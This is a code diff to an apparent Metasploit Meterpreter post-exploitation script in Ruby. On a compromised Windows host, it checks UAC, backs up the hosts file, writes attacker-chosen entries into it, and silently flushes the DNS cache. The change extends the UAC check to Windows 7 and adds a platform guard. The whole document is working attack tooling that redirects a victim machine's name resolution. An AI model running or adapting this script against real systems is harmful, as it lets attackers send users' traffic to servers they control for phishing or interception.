@@ -35,7 +35,7 @@ hosts = session.fs.file.expand_path("%SYSTEMROOT%")+"\\System32\\drivers\\etc\\h
 #Function check if UAC is enabled
 def checkuac(session)
 	winver = session.sys.config.sysinfo
-	if winver["OS"] =~ (/Windows Vista/)
+	if winver["OS"] =~ (/Windows 7|Vista/)
 		print_status("Checking if UAC is enabled.")
 		open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", KEY_READ)
 		value = open_key.query_value("EnableLUA").data
@@ -67,29 +67,33 @@ def cleardnscach(session)
 	print_status("Clearing the DNS Cache")
 	session.sys.process.execute("cmd /c ipconfig /flushdns",nil, {'Hidden' => true})
 end
-
-@@exec_opts.parse(args) { |opt, idx, val|
-	case opt
-	when "-e"
-		checkuac(session)
-		backuphosts(session,hosts)
-		add2hosts(session,val,hosts)
-		cleardnscach(session)
-	when "-l"
-		checkuac(session)
-		if not ::File.exists?(val)
-			raise "File #{val} does not exists!"
-		else
+if client.platform =~ /win32|win64/
+	@@exec_opts.parse(args) { |opt, idx, val|
+		case opt
+		when "-e"
+			checkuac(session)
 			backuphosts(session,hosts)
-				::File.open(val, "r").each_line do |line|
-				add2hosts(session,line.chomp,hosts)
-			end
+			add2hosts(session,val,hosts)
 			cleardnscach(session)
+		when "-l"
+			checkuac(session)
+			if not ::File.exists?(val)
+				raise "File #{val} does not exists!"
+			else
+				backuphosts(session,hosts)
+				::File.open(val, "r").each_line do |line|
+					add2hosts(session,line.chomp,hosts)
+				end
+				cleardnscach(session)
+			end
+		when "-h"
+			usage
 		end
-	when "-h"
+	}
+	if args.length == 0
 		usage
 	end
-}
-if args.length == 0
-	usage
+else
+	print_error("This version of Meterpreter is not supported with this Script!")
+	raise Rex::Script::Completed
 end
